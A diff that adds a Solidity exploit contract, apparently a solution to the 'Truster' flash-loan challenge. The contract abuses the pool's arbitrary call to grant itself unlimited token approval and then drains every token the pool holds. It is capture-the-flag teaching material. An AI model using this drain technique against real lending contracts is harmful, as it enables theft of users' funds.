@@ -35,3 +35,24 @@ contract TrusterLenderPool is ReentrancyGuard {
         if (balanceAfter < balanceBefore) revert FlashLoanHasNotBeenPaidBack();
     }
 }
+
+contract TrusterExploit {
+    function attack(address _pool, address _token) public {
+        // initiate truster pool and erc20 token
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+        IERC20 token = IERC20(_token);
+
+        // approve ourselve to spend all token inside the pool
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            2 ** 256 - 1
+        );
+        // call flash loan
+        // no need to borrow, borrowAmount is 0
+        pool.flashLoan(0, msg.sender, _token, data);
+
+        // then transfer all token from pool to ourself
+        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
+    }
+}
